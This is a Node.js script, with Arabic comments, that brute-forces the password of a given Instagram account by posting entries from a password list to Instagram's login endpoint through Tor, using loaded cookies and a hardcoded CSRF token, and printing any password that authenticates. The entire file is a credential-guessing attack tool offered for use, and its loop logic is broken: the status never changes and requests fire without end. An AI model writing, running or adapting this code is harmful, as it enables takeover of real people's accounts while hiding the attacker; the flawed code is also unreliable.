const fs = require('fs');
const torrequest = require('tor-request');

const username = process.argv[2];
const passlist = process.argv[3];

// تحديد اسم ملف الكوكيز هنا
const cookiesFileName = 'cookies.txt';

if (!username || !passlist) {
  console.log('\n[!] Usage: node script.js username pass.txt\n');
  process.exit(1);
}

const passwordList = fs.readFileSync(passlist, 'utf8').split('\n');

(async () => {
  try {
    console.log(`\n[!] Username [${username}]`);

    // قراءة الكوكيز من الملف إذا كان متاحًا
    let cookieString = '';
    if (fs.existsSync(cookiesFileName)) {
      cookieString = fs.readFileSync(cookiesFileName, 'utf-8');
      console.log(`\n[!] Cookies loaded from ${cookiesFileName}`);
    } else {
      console.log(`\n[!] Cookies file (${cookiesFileName}) not found, proceeding without cookies.`);
    }

    console.log(`\n[!] Password list loaded successfully!`);
    console.log(`\n[!] ${passwordList.length} passwords have been loaded.`);
    console.log(`\n[!] Starting the attack...\n`);

    let loaded = 0;
    let current = 1;

    for (const password of passwordList) {
      let status = "fail";

      while (status === "fail") {
        if (password.length < 6) {
          console.log(`[!] [${current}/${passwordList.length}] Password Shorter Than 6 Characters [${password}]`);
          current++;
          break;
        }

        torrequest.request('https://www.instagram.com/', (error, response, body) => {
          if (!error && response.statusCode === 200) {
            // هنا حيث يجب وضع الرمز CSRF
            const csrf = 'zAHSeFscJlgwhASDcrK2tmQEceavt5rq'; // الرمز CSRF الذي قدمته

            torrequest.post('https://www.instagram.com/accounts/login/ajax/', {
              form: {
                username: username,
                password: password,
                csrf: csrf,
              },
              headers: {
                'Cookie': cookieString, // إضافة الكوكيز هنا إذا كانت متوفرة
              },
            }, (error, response, body) => {
              // اكمل الكود لمعالجة استجابة تسجيل الدخول هنا
              if (!error && response.statusCode === 200) {
                const jsonResponse = JSON.parse(body);
                if (jsonResponse.authenticated) {
                  console.log(`[!] [${current}/${passwordList.length}] Password Found: [${password}]`);
                  process.exit(0); // توقف البرنامج بعد العثور على كلمة المرور
                } else {
                  console.log(`[!] [${current}/${passwordList.length}] Password Incorrect: [${password}]`);
                }
              } else {
                console.log(`[!] [${current}/${passwordList.length}] Request Error: ${error}`);
              }
            });

            current++;

          } else {
            console.log(`[!] [${current}/${passwordList.length}] Request Error: ${error}`);
          }
        });
      }
    }

    console.log(`\n[!] Oh no! The password for the account [${username}] is not in the list! :(`);

  } catch (error) {
    console.error(error.message);
  }
})();
